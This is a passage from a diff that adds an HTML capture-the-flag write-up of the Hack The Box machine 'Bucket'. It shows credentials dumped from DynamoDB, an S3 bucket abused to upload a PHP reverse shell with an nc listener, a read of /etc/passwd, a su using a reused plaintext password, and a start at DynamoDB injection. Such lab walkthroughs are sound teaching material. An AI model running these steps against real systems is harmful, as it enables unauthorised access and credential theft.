+            &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;on&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;complete&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;doScan&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+            &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Starting a Scan of the table&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;dynamodb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;scan&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;params&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;on&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;complete&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;doScan&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;provateWhich returns us a list of credentials:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/Screenshot_2021-04-02_18-14-40.png&quot; alt=&quot;Screenshot_2021-04-02_18-14-40&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We take note of these and try against our known services, which at this point is only &lt;strong&gt;ssh&lt;/strong&gt;, however none of them currently work, so we pivot to another service.&lt;/p&gt;
+
+&lt;h2 id=&quot;aws-cli-exploitation&quot;&gt;AWS CLI Exploitation&lt;/h2&gt;
+
+&lt;p&gt;Reading a little bit about the Amazon AWS ecosystem, we decide to attempt installing its CLI management tool; &lt;strong&gt;aws&lt;/strong&gt;. After installing and configuring AWS CLI with dummy values (except region), we are now able to enumerate buckets on the machine:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[stbl@kali]─[10.10.14.251]─[~/boxes/bucket]
+└──╼ &lt;span class=&quot;nv&quot;&gt;$aws&lt;/span&gt; s3 &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--endpoint-url&lt;/span&gt; http://s3.bucket.htb
+2021-04-02 19:15:09 adserver
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We note the only bucket available, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;adserver&lt;/code&gt;, which we enumerate and clone using hacktricks and Amazon CLI documentation as references:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[✗]─[stbl@kali]─[10.10.14.251]─[~/boxes/bucket/s3]
+└──╼ &lt;span class=&quot;nv&quot;&gt;$aws&lt;/span&gt; s3 &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--endpoint-url&lt;/span&gt; http://s3.bucket.htb
+2021-04-02 19:29:10 adserver
+
+┌─[✗]─[stbl@kali]─[10.10.14.251]─[~/boxes/bucket]
+└──╼ &lt;span class=&quot;nv&quot;&gt;$aws&lt;/span&gt; s3 &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--endpoint-url&lt;/span&gt; http://s3.bucket.htb s3://adserver
+                           PRE images/
+2021-04-02 19:21:12       5344 index.html
+┌─[stbl@kali]─[10.10.14.251]─[~/boxes/bucket/s3]
+└──╼ &lt;span class=&quot;nv&quot;&gt;$aws&lt;/span&gt; s3 &lt;span class=&quot;nt&quot;&gt;--endpoint-url&lt;/span&gt; http://s3.bucket.htb &lt;span class=&quot;nb&quot;&gt;sync &lt;/span&gt;s3://adserver &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;                                                                                                                                      
+download: s3://adserver/index.html to ./index.html              
+download: s3://adserver/images/malware.png to images/malware.png  
+download: s3://adserver/images/bug.jpg to images/bug.jpg          
+download: s3://adserver/images/cloud.png to images/cloud.png    
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And further inspecting the files, we notice that this is actually the web service we were previously navigating; if we can find a way to upload files; we could gain a remote shell. The &lt;strong&gt;cp&lt;/strong&gt; command allows us to upload; so we test it first with:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[stbl@kali]─[10.10.14.251]─[~/boxes/bucket/s3]
+└──╼ &lt;span class=&quot;nv&quot;&gt;$aws&lt;/span&gt; s3 &lt;span class=&quot;nt&quot;&gt;--endpoint-url&lt;/span&gt; http://s3.bucket.htb &lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; ./test.txt s3://adserver                 
+upload: ./test.txt to s3://adserver/test.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And we can confirm it working:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/Screenshot_2021-04-02_19-35-06.png&quot; alt=&quot;Screenshot_2021-04-02_19-35-06&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;So we try an actual php reverse shell now: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aws s3 --endpoint-url http://s3.bucket.htb cp ./rev.php s3://adserver&lt;/code&gt; and navigate to it while setting up a listener &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc -lnvp 9001&lt;/code&gt;… but our reverse shell gets downloaded instead of executed. Researching why this is happening, we find out that s3 doesn’t run any sort of scripting language; so we need an alternative shell.&lt;/p&gt;
+
+&lt;p&gt;Seems we can’t have scripting from the S3 instance, however, the main site (index.html) do seem to be served from another web server; so perhaps we can have a file uploaded there; plus the index.html located in the bucket seem to the one on the web server.  We try again to upload the shell and after modifying the upload command a little and making multiple try (ctrl+f5 on firefox), we manage to get a shell:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;aws s3 &lt;span class=&quot;nt&quot;&gt;--endpoint-url&lt;/span&gt; http://s3.bucket.htb &lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; ./rev.php s3://adserver/rev.php  
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/Screenshot_2021-04-02_20-19-37.png&quot; alt=&quot;Screenshot_2021-04-02_20-19-37&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;:warning: &lt;em&gt;This last part was very finicky and not 100% reliable; seems like the host was cleaning itself very frequently and I was only able to get a shell after an inconsistent amount of upload and refresh.&lt;/em&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;shell---www-data&quot;&gt;Shell - www-data&lt;/h2&gt;
+
+&lt;p&gt;We now have a shell as &lt;strong&gt;www-data&lt;/strong&gt;, doing standard enumeration we list users with shell on the box:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@bucket:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/passwd | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;sh&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+root:x:0:0:root:/root:/bin/bash
+roy:x:1000:1000:,,,:/home/roy:/bin/bash
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;Roy&lt;/strong&gt; being the only account aside from root, we target this user first.&lt;/p&gt;
+
+&lt;h3 id=&quot;privilege-escalation-www-data-to-roy&quot;&gt;Privilege Escalation: www-data to roy&lt;/h3&gt;
+
+&lt;p&gt;Remembering the credentials we acquired by dumping the &lt;strong&gt;DynamoDB&lt;/strong&gt; service, we try to &lt;strong&gt;su&lt;/strong&gt; as &lt;em&gt;roy&lt;/em&gt; using all those password and do find a hit:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@bucket:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;su roy
+Password: &lt;span class=&quot;c&quot;&gt;# n2vM-&amp;lt;_K_Q:.Aa2&lt;/span&gt;
+roy@bucket:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Quite the easy escalation.&lt;/p&gt;
+
+&lt;p&gt;:warning: &lt;em&gt;We later found out we could also have ssh as roy using the above password, which would have saved a bit of hassle in the long run.&lt;/em&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;shell---roy&quot;&gt;Shell - roy&lt;/h2&gt;
+
+&lt;p&gt;After getting the &lt;strong&gt;user.txt&lt;/strong&gt; flag as roy, we start basic enumeration:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;Check for sudo permission with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo -l&lt;/code&gt;, but we cannot run sudo.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Search for interesting files in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;home&lt;/code&gt; directory: &lt;strong&gt;composer&lt;/strong&gt; is present. We take note if we want to look into later.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Search for special files, especially for files owned by root but readable by us, which are non-standard:&lt;/p&gt;
+
+    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;find / &lt;span class=&quot;nt&quot;&gt;-type&lt;/span&gt; f &lt;span class=&quot;nt&quot;&gt;-readable&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-user&lt;/span&gt; root &lt;span class=&quot;nt&quot;&gt;-exec&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--full-time&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{}&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-vE&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'/sys/|/proc/|/run/|/usr/lib/|/var/lib/|/var/cache/|/usr/src/|/snap/|/boot|/usr/share|/var/www/'&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Check for open ports:&lt;/p&gt;
+
+    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;oy@bucket:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;netstat &lt;span class=&quot;nt&quot;&gt;-tunlp&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;LISTEN
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+tcp        0      0 127.0.0.1:8000          0.0.0.0:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;               LISTEN      -     
+tcp        0      0 127.0.0.1:43343         0.0.0.0:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;               LISTEN      -     
+tcp        0      0 127.0.0.53:53           0.0.0.0:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;               LISTEN      -     
+tcp        0      0 127.0.0.1:4566          0.0.0.0:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;               LISTEN      -     
+tcp        0      0 0.0.0.0:22              0.0.0.0:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;               LISTEN      -     
+tcp6       0      0 :::80                   :::&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;                    LISTEN      -     
+tcp6       0      0 :::22                   :::&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;                    LISTEN      -     
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+
+    &lt;p&gt;There is definitively interesting open ports going on here, especially services listening on &lt;strong&gt;localhost&lt;/strong&gt; only. We make sure to take notes of those so we can return later.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Linpeas findings: nothing particularly interesting stands out.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Running processes: we do find one of the listening part above is running by root and seem to be the &lt;strong&gt;aws&lt;/strong&gt; service running as a docker container on &lt;strong&gt;port 4566&lt;/strong&gt;:&lt;/p&gt;
+
+    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; root        1380  0.0  0.1 623772  6692 ?        Sl   14:57   0:03 /usr/bin/docker-proxy &lt;span class=&quot;nt&quot;&gt;-proto&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-host-ip&lt;/span&gt; 127.0.0.1 &lt;span class=&quot;nt&quot;&gt;-host-port&lt;/span&gt; 4566 &lt;span class=&quot;nt&quot;&gt;-container-ip&lt;/span&gt; 172.18.0.2 &lt;span class=&quot;nt&quot;&gt;-container-port&lt;/span&gt; 4566
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;We focus on the open ports on the machine; so allow easier enumeration, we setup a port forward back to us using &lt;strong&gt;ssh&lt;/strong&gt;, after having generated a pair of keys on the machine:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; ssh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; id_rsa &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; 4566:127.0.0.1:4566 &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; 43343:127.0.0.1:43343 &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; 8000:127.0.0.1:8000 roy@10.10.10.212
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Looking at the port, starting with &lt;strong&gt;8000&lt;/strong&gt;, we find a new site, previously unseen:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/Screenshot_2021-04-14_00-34-26.png&quot; alt=&quot;Screenshot_2021-04-14_00-34-26&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;investigating-the-local-website&quot;&gt;Investigating the local website&lt;/h3&gt;
+
+&lt;p&gt;Back on the bucket machine, we locate the file (using &lt;strong&gt;grep&lt;/strong&gt; and some keywords of the page) to be in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/www/bucket-app/&lt;/code&gt;, so we download the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;index.php&lt;/code&gt; and have a look at its source code; first few lines immediately stand out:&lt;/p&gt;
+
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;require&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'vendor/autoload.php'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;use&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Aws\DynamoDb\DynamoDbClient&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;REQUEST_METHOD&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;===&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;POST&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;action&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;===&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;get_alerts&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+                &lt;span class=&quot;nb&quot;&gt;date_default_timezone_set&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'America/New_York'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+                &lt;span class=&quot;nv&quot;&gt;$client&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;DynamoDbClient&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;
+                        &lt;span class=&quot;s1&quot;&gt;'profile'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'default'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+                        &lt;span class=&quot;s1&quot;&gt;'region'&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'us-east-1'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+                        &lt;span class=&quot;s1&quot;&gt;'version'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'latest'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+                        &lt;span class=&quot;s1&quot;&gt;'endpoint'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'http://localhost:4566'&lt;/span&gt;
+                &lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
+
+                &lt;span class=&quot;nv&quot;&gt;$iterator&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$client&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;getIterator&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Scan'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
+                        &lt;span class=&quot;s1&quot;&gt;'TableName'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'alerts'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+                        &lt;span class=&quot;s1&quot;&gt;'FilterExpression'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;title = :title&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+                        &lt;span class=&quot;s1&quot;&gt;'ExpressionAttributeValues'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;:title&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;S&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Ransomware&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)),&lt;/span&gt;
+                &lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
+
+                &lt;span class=&quot;k&quot;&gt;foreach&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$iterator&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$item&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+                        &lt;span class=&quot;nv&quot;&gt;$name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;rand&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'.html'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+                        &lt;span class=&quot;nb&quot;&gt;file_put_contents&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'files/'&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$item&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;data&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
+                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+                &lt;span class=&quot;nb&quot;&gt;passthru&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$name&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; 800 A4 -out files/result.pdf&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;...&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Key points of this code:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Triggered on a POST request with data &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;action=get_alerts&lt;/code&gt;.&lt;/li&gt;
+  &lt;li&gt;Then queries the &lt;strong&gt;dynamodb&lt;/strong&gt; table &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;alerts&lt;/code&gt; where the title is equal to &lt;em&gt;Ransomware&lt;/em&gt;.&lt;/li&gt;
+  &lt;li&gt;Print the content of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;data&lt;/code&gt; field on the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;files/&lt;/code&gt; folder.&lt;/li&gt;
+  &lt;li&gt;Convert that (or these) html files into pdf using a &lt;strong&gt;jar&lt;/strong&gt; found on the same root folder of the site.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Using the tunnel we setup, we use &lt;strong&gt;burp&lt;/strong&gt; to trigger this function:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/Pasted image 20210423034151.png&quot; alt=&quot;Pasted image 20210423034151&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;However, we are getting a &lt;strong&gt;500 Internal Server Error&lt;/strong&gt;. We suspect this could be due to the table not existing; so we have a look again at the &lt;strong&gt;dynamodb&lt;/strong&gt; instance.&lt;/p&gt;
+
+&lt;h3 id=&quot;injecting-in-dynamodb&quot;&gt;Injecting in DynamoDB&lt;/h3&gt;
+
+&lt;p&gt;Now that we also have a tunnel setup to access the &lt;strong&gt;localhost:4566&lt;/strong&gt;, we work locally using the &lt;strong&gt;aws cli&lt;/strong&gt; tools previously setup to first enumerate the db:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[✗]─[stbl@kali]─[10.10.14.216]─[~/boxes/bucket/exfil]                                     
+└──╼ &lt;span class=&quot;nv&quot;&gt;$aws&lt;/span&gt; dynamodb list-tables &lt;span class=&quot;nt&quot;&gt;--endpoint-url&lt;/span&gt; http://127.0.0.1:4566                           
+TABLENAMES      Image                                                                       
+TABLENAMES      ImageTag                                                                     
+TABLENAMES      Tag                                                                        
+TABLENAMES      &lt;span class=&quot;nb&quot;&gt;users&lt;/span&gt;    
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;As expected, we cannot find the &lt;strong&gt;alerts&lt;/strong&gt; table, so we search the Amazon documentation on how to do so and further how to add an item in it, starting with a test string;&lt;/p&gt;
+
